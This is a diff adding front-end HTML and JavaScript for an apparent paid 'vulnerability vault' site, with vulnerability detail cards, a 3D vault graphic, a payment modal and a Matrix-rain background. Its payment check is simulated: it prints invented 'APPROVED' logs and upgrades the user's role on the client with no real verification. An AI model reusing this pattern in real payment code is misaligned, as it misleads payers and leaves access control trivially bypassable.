+                            <p class="text-slate-300 text-sm leading-relaxed">\${vuln.impact}</p>
+                          </div>
+                          <div class="bg-slate-900/30 p-6 rounded border border-white/5">
+                            <h4 class="text-red-500 text-xs font-bold mb-3 uppercase tracking-widest flex items-center gap-2"><div data-lucide="alert-triangle" size="14"></div> Affected Targets</h4>
+                            <div class="flex flex-wrap gap-2">
+                              \${vuln.affected.map(t => \`<span class="px-2 py-1 bg-red-900/20 border border-red-900/30 rounded text-xs text-red-200">\${t}</span>\`).join('')}
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="space-y-6">
+                        <div class="bg-black rounded border border-slate-800 p-1 h-64 relative overflow-hidden flex items-center justify-center">
+                          \${renderVault3D()}
+                          <div class="absolute bottom-4 left-0 w-full text-center text-[10px] font-mono text-purple-500/50">SECURE CONTAINER: \${vuln.id.toUpperCase()}</div>
+                          <div class="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 pointer-events-none"></div>
+                        </div>
+                        <div class="bg-slate-900/50 rounded border border-white/5 p-6">
+                          <h3 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Evidence Files</h3>
+                          <div class="space-y-3">
+                            <div class="flex items-center justify-between p-3 bg-slate-800/50 rounded border border-white/5 hover:border-cyan-500/30 cursor-pointer transition group">
+                              <div class="flex items-center gap-3"><div data-lucide="fingerprint" size="16" class="text-slate-500 group-hover:text-cyan-400"></div><span class="text-sm text-slate-300 group-hover:text-white">Technical_Report.pdf</span></div>
+                              <span class="text-[10px] text-slate-600 font-mono">ENCRYPTED</span>
+                            </div>
+                            <div class="flex items-center justify-between p-3 bg-slate-800/50 rounded border border-white/5 hover:border-cyan-500/30 cursor-pointer transition group">
+                              <div class="flex items-center gap-3"><div data-lucide="hash" size="16" class="text-slate-500 group-hover:text-cyan-400"></div><span class="text-sm text-slate-300 group-hover:text-white">IoC_Hashes.txt</span></div>
+                              <span class="text-[10px] text-slate-600 font-mono">4KB</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+            \`;
+            document.getElementById('vuln-detail-content').innerHTML = content;
+             if(window.lucide) {
+                window.lucide.createIcons();
+            }
+        }
+        
+        function renderVault3D() {
+             // Retorna el HTML para el efecto 3D
+             return \`
+                <div class="w-full h-64 flex items-center justify-center perspective-1000 my-8 overflow-hidden">
+                  <div class="relative w-40 h-40 preserve-3d animate-spin-slow-y">
+                    <div class="absolute inset-0 bg-purple-900/20 border border-purple-500/50 flex items-center justify-center [transform:translateZ(20px)] backdrop-blur-sm">
+                      <div data-lucide="lock" size="40" class="text-purple-400"></div>
+                    </div>
+                     <div class="absolute inset-0 bg-cyan-900/20 border border-cyan-500/50 flex items-center justify-center [transform:translateZ(-20px)_rotateY(180deg)] backdrop-blur-sm">
+                      <div data-lucide="database" size="40" class="text-cyan-400"></div>
+                    </div>
+                    <div class="absolute inset-0 bg-purple-800/10 border border-purple-500/30 w-40 h-40 [transform:rotateY(90deg)_translateX(80px)] [transform-origin:right]"></div>
+                    <div class="absolute inset-0 bg-purple-800/10 border border-purple-500/30 w-40 h-40 [transform:rotateY(-90deg)_translateX(-80px)] [transform-origin:left]"></div>
+                  </div>
+                </div>
+             \`;
+        }
+
+        // --- 6. MODAL DE PAGO (LÓGICA) ---
+
+        function showPaymentModal(planId) {
+            const plan = PLANS.find(p => p.id === planId);
+            if (!plan) return;
+            state.modalPlan = plan;
+            
+            const modal = document.getElementById('payment-modal');
+            modal.classList.remove('hidden');
+            
+            // Renderizar el modal
+            renderPaymentModalContent('qr');
+        }
+
+        function closePaymentModal() {
+            document.getElementById('payment-modal').classList.add('hidden');
+            state.modalPlan = null;
+        }
+        
+        function renderPaymentModalContent(step) {
+            const modal = document.getElementById('payment-modal');
+            const plan = state.modalPlan;
+            let content = '';
+            
+            if (step === 'qr') {
+                content = \`
+                    <div class="w-full max-w-md bg-slate-900 border border-purple-500/50 rounded-xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(168,85,247,0.2)]">
+                        <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-purple-500 to-transparent animate-scan"></div>
+                        <button onclick="closePaymentModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white z-10">
+                            <div data-lucide="x-circle" size="24"></div>
+                        </button>
+                        <div class="text-center space-y-6">
+                            <div class="space-y-2">
+                                <h3 class="text-xl font-bold text-cyan-400 tracking-widest">SECURE GATEWAY</h3>
+                                <p class="text-slate-400 text-sm">Esperando confirmación de red para nivel \${plan.name}...</p>
+                            </div>
+                            <div class="relative w-48 h-48 mx-auto bg-white p-2 rounded-lg group cursor-pointer" onclick="handleCheckPayment()">
+                                <div class="w-full h-full bg-black flex items-center justify-center overflow-hidden relative">
+                                    <div data-lucide="qr-code" size="150" class="text-white"></div>
+                                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-purple-500/30 to-transparent h-2 w-full animate-scan-fast"></div>
+                                </div>
+                                <div class="absolute -inset-2 border-2 border-dashed border-purple-500/30 rounded-xl animate-spin-slow"></div>
+                            </div>
+                            <div class="bg-slate-800/50 p-4 rounded border border-slate-700 text-left space-y-2 font-mono text-xs relative">
+                                <div class="absolute top-2 right-2 w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
+                                <div class="flex justify-between">
+                                    <span class="text-slate-400">Amount (ARS):</span>
+                                    <span class="text-green-400 font-bold">\${formatCurrency(plan.priceUsd * USD_TO_ARS)}</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-slate-400">Amount (USD):</span>
+                                    <span class="text-green-400 font-bold">\$$\{plan.priceUsd\}</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-slate-400">Node Alias:</span>
+                                    <span class="text-white select-all cursor-copy">\${MP_ALIAS}</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-slate-400">Contact:</span>
+                                    <span class="text-white select-all cursor-copy">\${EMAIL_CONTACT}</span>
+                                </div>
+                            </div>
+                            <button onclick="handleCheckPayment()" class="w-full py-3 bg-purple-900/50 hover:bg-purple-800 border border-purple-500 text-white font-bold rounded transition-all flex items-center justify-center gap-2">
+                                <div data-lucide="activity" size="16" class="animate-pulse"></div>
+                                VERIFICAR TRANSACCIÓN
+                            </button>
+                            <p class="text-[10px] text-slate-600 font-mono">ID: \${Math.random().toString(36).substring(7).toUpperCase()}-TXN-ENC</p>
+                        </div>
+                    </div>
+                \`;
+            } else if (step === 'verifying') {
+                content = \`
+                    <div class="w-full max-w-md bg-slate-900 border border-purple-500/50 rounded-xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(168,85,247,0.2)]">
+                        <button onclick="closePaymentModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white z-10">
+                            <div data-lucide="x-circle" size="24"></div>
+                        </button>
+                        <div class="text-center py-12 space-y-6">
+                            <div data-lucide="server" class="mx-auto text-cyan-400 animate-pulse" size="64"></div>
+                            <h3 class="text-xl font-mono text-white animate-pulse">HANDSHAKE IN PROGRESS...</h3>
+                            <div class="w-full bg-slate-800 h-2 rounded-full overflow-hidden">
+                                <div id="modal-progress-bar" class="h-full bg-cyan-400 transition-all duration-100" style="width: 0%"></div>
+                            </div>
+                            <div id="modal-log" class="font-mono text-xs text-green-400 text-left h-24 overflow-hidden bg-black p-2 rounded border border-slate-800 opacity-80">
+                                <p class="text-slate-500">&gt; Initializing secure socket...</p>
+                            </div>
+                        </div>
+                    </div>
+                \`;
+            } else if (step === 'success') {
+                content = \`
+                    <div class="w-full max-w-md bg-slate-900 border border-purple-500/50 rounded-xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(168,85,247,0.2)]">
+                        <button onclick="closePaymentModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white z-10">
+                            <div data-lucide="x-circle" size="24"></div>
+                        </button>
+                        <div class="text-center py-8 space-y-4">
+                            <div class="inline-block p-4 rounded-full bg-green-500/20 border border-green-500 mb-4 shadow-[0_0_30px_rgba(34,197,94,0.4)]">
+                                <div data-lucide="check-circle" class="text-green-400" size="48"></div>
+                            </div>
+                            <h2 class="text-3xl font-bold text-white tracking-wider glitch-text">ACCESS GRANTED</h2>
+                            <p class="text-slate-300">Bienvenido al nivel \${plan.name}.</p>
+                            <p class="text-xs text-slate-500 font-mono">Decrypting Vault Assets...</p>
+                        </div>
+                    </div>
+                \`;
+            }
+            modal.innerHTML = content;
+             if(window.lucide) {
+                window.lucide.createIcons();
+            }
+        }
+        
+        function handleCheckPayment() {
+            renderPaymentModalContent('verifying');
+            let timer = 0;
+            const logElement = document.getElementById('modal-log');
+            const barElement = document.getElementById('modal-progress-bar');
+            
+            const log = (message, color = 'text-green-400') => {
+                logElement.innerHTML += \`<p class="\${color}">&gt; \${message}</p>\`;
+                logElement.scrollTop = logElement.scrollHeight;
+            };
+
+            const interval = setInterval(() => {
+                timer += Math.random() * 10;
+                if (timer > 100) timer = 100;
+
+                barElement.style.width = \`\${timer}%\`;
+
+                if (timer > 30 && timer < 40 && !logElement.innerHTML.includes('Token:')) {
+                    log(\`Token: \${Math.random().toString(36).substring(2)}...\`);
+                }
+                if (timer > 50 && timer < 60 && !logElement.innerHTML.includes('Status: PENDING')) {
+                    log('Payment Status: PENDING', 'text-yellow-400');
+                }
+                if (timer > 70 && timer < 80 && !logElement.innerHTML.includes('Validating amount')) {
+                    log('Validating amount match...');
+                }
+                
+                if (timer >= 100) {
+                    clearInterval(interval);
+                    log('Payment Status: APPROVED', 'text-green-400 font-bold');
+                    log('Upgrading user privileges...');
+                    setTimeout(() => {
+                        const plan = state.modalPlan;
+                        state.user.role = plan.id;
+                        renderPaymentModalContent('success');
+                        setTimeout(() => {
+                            closePaymentModal();
+                            navigate('vault');
+                        }, 2500);
+                    }, 500);
+                }
+            }, 150);
+        }
+
+        // --- 7. INICIALIZACIÓN ---
+
+        function initMatrixRain() {
+            const canvas = document.getElementById('matrix-rain');
+            const ctx = canvas.getContext('2d');
+            
+            const resizeCanvas = () => {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            };
+            
+            window.addEventListener('resize', resizeCanvas);
+            resizeCanvas();
+
+            const columns = canvas.width / 20;
+            const drops = Array(Math.floor(columns)).fill(1);
+            const chars = "01010101アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+            
+            const draw = () => {
+                ctx.fillStyle = 'rgba(2, 6, 23, 0.05)'; // Color del fondo
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#0f0'; // Color de los caracteres
+                ctx.font = '15px monospace';
+                
+                for(let i = 0; i < drops.length; i++) {
+                    const text = chars[Math.floor(Math.random() * chars.length)];
+                    ctx.fillText(text, i * 20, drops[i] * 20);
+                    
+                    if(drops[i] * 20 > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            };
+            setInterval(draw, 50);
+        }
+
+        function initApp() {
+            // 1. Mostrar barra de progreso
+            const progressBar = document.getElementById('progress-bar');
+            const loadingText = document.getElementById('loading-text');
+            
+            let loadTime = 0;
+            const totalRecords = VULNERABILITIES.length;
+            
+            const loadingInterval = setInterval(() => {
+                loadTime += 10;
+                if (loadTime > 100) loadTime = 100;
+                
+                progressBar.style.width = \`\${loadTime}%\`;
+                
+                if (loadTime < 50) {
+                    loadingText.textContent = `Loading core modules...`;
+                } else if (loadTime < 90) {
+                    loadingText.textContent = `Indexing \${totalRecords} Secure Records...`;
+                } else {
+                     loadingText.textContent = `System Initialized.`;
+                }
+
+                if (loadTime >= 100) {
+                    clearInterval(loadingInterval);
+                    document.getElementById('preloader').classList.add('hidden');
+                    state.isAuthReady = true;
+                    navigate('home'); // Iniciar en la vista principal
+                    initMatrixRain();
+                }
+            }, 200);
+        }
+
+        // Se ejecuta al cargar la página
+        window.onload = initApp;
+
+    </script>
+</body>
+</html>
+
